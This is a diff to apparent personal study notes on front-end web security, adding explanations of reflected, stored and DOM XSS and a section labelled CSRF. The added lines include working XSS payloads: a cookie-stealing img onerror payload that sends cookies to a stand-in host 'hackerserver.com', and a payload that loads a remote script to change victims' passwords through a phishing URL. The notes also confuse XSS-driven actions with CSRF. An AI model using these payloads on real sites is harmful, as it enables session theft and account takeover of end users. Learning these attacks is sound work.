@@ -53,10 +53,11 @@
 
 ## IMPORTAN SECURITY NOTE.
 
-- for a web developer, it is important to make sure that there is no sensitive information get send to the front-end client because those information are publicly available to the client to view.
-- we should never perform password checking or storing API keys in a client side code.
+- for a web developer, it is important to make sure that there is no sensitive information in front-end code because those information are publicly available to the client to view.
+- we should never perform password checking or storing API keys of other services in a client side code.
+- it is unwise to direcly connect to a database from a front-end code, because database credentials used to connect to it can easily be seen by the client.
 - a vulnerability in front end usually does't directly effecting the back end server permanently as it just happen in the client browser and get reset whenever client re-render the webpage.
-- but it can sometimes cause problem to the end user that are using the website.
+- but it can sometimes cause problem to the end user that are using the website example like XSS attack or page defacement.
 
 ## Leaks sensitve information.
 
@@ -89,14 +90,100 @@
   - they can also use this to createe phising such as login form that will submit to an attacker server.
   - attacker can also inject ads to generate money.
 
-### In case of Code Injection.
+### XSS (Cross-site Scripting)
 
-- inject code to the server
+- this attack is leveraging the vulnerabilities of html injection.
+- when our code doesn't sanitise or validate user input, an attacker can inject JavaScript code into the database.
+- the stored code, latter when fetched by other user, will get rendered to their webpage.
+- an attacker can craft javascript payload to steal and transport data such as user cookies, token, ip address etc..
+- there are 3 main type of XSS attack:
 
-### In case of SQL Injection.
+  - Reflected XSS
+    - happen when, attacker inject a payload, and the payload immediatly reflected/ get shown back to the attacker.
+    - example is when attacker inject code into vuln search form.
+    - website usually reflect back user input to let they know of the search result.
+    - as example a attacker inject `<b>hello</b> ` using `<b>` tag to make text bold, into the search form.
+    - the webpage respond with "Your search result for: **hello**", in this case the word hello are shown in bold. indicating that the webpage doesn't sanitize the html tag properly and the input get reflected as the attacker sent.
+    - some webpage simply get over this by output it back as a string `"<b>hello</b>"`, so it not get rendered as html element.
+  - Stored XSS
 
--
+    - the different between this XSS and reflected is that, the user input here are stored in database, and then get reflected back to user.
+    - maybe the dev doesn't sanitize the input before store it in database.
+    - this happen when attacker injecting a form, or API that will get save data in database.
 
-### In case of Command Injection.
+  - DOM XSS
 
--
+    - DOM XSS is like reflected XSS, there there is a client-side javascript, that take unfiltered user input, and add it to the DOM.
+
+    ```js
+    const searchForm = document.getElementById("search");
+    const searchResultText = document.getElementById("resultText");
+
+    searchResultText.innerHTML = "You Search Result for:" + searchForm.value;
+    ```
+
+    - when rendered will show something like
+
+    <h2>You Search Result for: <b>hello</b> </h2>
+    - if we inject a javascript to create alert or get `document.cookie`
+    - the webpage will render it as a new DOM element and execute the code.
+    - with the same code as above, let say attacker try this as input
+
+    ```html
+    <script>
+      alert(1);
+    </script>
+    ```
+
+    - this might not show anything,
+    - HTML5 does not allow script tags to be dynamically added using the innerHTML property.
+    - attacker can make use of other ways to invoke javaScript such as
+
+    ```html
+    <img src=/ onerror=alert(1)>
+    ```
+
+    - this might work and we can see an alert box.
+    - we can then try to get cookie using the same ways.
+
+    ```html
+    <img src=/ onerror=alert(document.cookie)>
+    ```
+
+    - we can sent the cookie to our own server listening for a get request with the cookies as query.
+    - example our attacker server `http://hackerserver.com/?cookie=`;
+    - in the XSS payload we can send it using
+
+    ```html
+    <img src= /
+    onerror="this.src='http://hackerserver.com/?cookie='+document.cookie;
+    this.removeAttribute('onerror');">
+    ```
+
+### Cross-site Request Forgery (CSRF).
+
+- [usefull resource](https://labs.f-secure.com/blog/getting-real-with-xss/)
+- this attack is the next step for XSS attack, it leverage the XSS vulnerabilities to send request or API call to back-end server using the victim sessions/token
+- this give the attacker full control of their victim account.
+- they can craft payload, to change the victim password, whenever the victim load xss in their webpage, the victim will unknowingly get their password changed.
+- an attacker can host malicious script on their server named `chgpass.js` and then add the link to the XSS payload and inject it to the vulnerable site.
+- they can use the payload either thru malicious URL or stored XSS.
+- let say malicious URL.
+  - the website `http://victim.com/`, have a DOM XSS vulnerabilities when user send a query like this.
+  ```
+  http://victim.com/search.php?term=<img src=/ onerror=alert(1)>
+  ```
+  - using previous payload we might send the link to other user, maybe via phising email or chat.
+  - we can use this payload to append a new script tag to the DOM.
+  ```html
+  <img src=/ onerror="var x=document.createElement('script');
+  x.src='http://hackerserver.com/chgpass.js';
+  document.getElementsByTagName('head')[0].appendChild(x);"/>
+  ```
+  - the URL will look something like this.
+  ```
+  http://victim.com/search.php?term=<img src=/ onerror="var x=document.createElement('script');
+  x.src='http://hackerserver.com/chgpass.js';
+  document.getElementsByTagName('head')[0].appendChild(x);"/>
+  ```
+  - a user or admin that are logged in to `http://victim.com` might see that the url is from the same domain, then if they clicked on the link, it will then execute the script in the background.
